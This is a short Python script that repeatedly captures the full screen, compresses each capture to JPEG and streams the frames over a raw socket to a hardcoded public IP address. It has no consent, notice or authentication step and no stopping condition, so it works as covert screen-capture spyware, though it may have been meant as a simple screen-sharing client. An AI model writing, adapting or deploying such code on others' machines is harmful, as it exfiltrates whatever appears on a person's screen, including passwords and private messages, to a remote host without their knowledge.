import socket
from io import BytesIO
from PIL import ImageGrab
from time import sleep
host = '113.189.194.67'
# host = '192.168.1.33'
port = 9999
data_max = 1024

client = socket.socket()
client.connect((host, port))
while True:
    try:
        img_buffer = BytesIO()
        ImageGrab.grab().save(img_buffer, 'JPEG', quality=50)
        img_buffer.seek(0)
        offset = 0
        data = b'--frame\r\n'+b'Content-Type: image/jpg\r\n\r\n' + img_buffer.read() + b'\r\n\r\n'
        while offset<len(data):
            chunk = data[offset:offset + data_max]
            client.send(chunk)
            client.recv(data_max) # recv ok
            offset += len(chunk)
        client.send(b'done') # done
    except Exception as e:
        print(e)